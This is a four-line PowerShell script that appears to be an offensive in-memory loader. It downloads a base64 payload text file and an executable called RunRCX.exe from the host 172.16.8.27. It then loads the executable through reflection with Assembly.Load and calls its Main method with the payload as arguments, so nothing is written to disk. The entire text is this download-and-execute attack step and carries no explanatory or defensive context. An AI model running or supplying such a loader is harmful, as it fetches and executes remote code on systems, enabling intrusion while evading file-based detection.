$payload = (New-Object Net.WebClient).DownloadString("http://172.16.8.27/b64Output.txt");
$loader = (New-Object Net.WebClient).DownloadData("http://172.16.8.27/RunRCX.exe");
[System.Reflection.Assembly]::Load($loader);
[BlockMe.Program]::Main("$payload 2".Split());
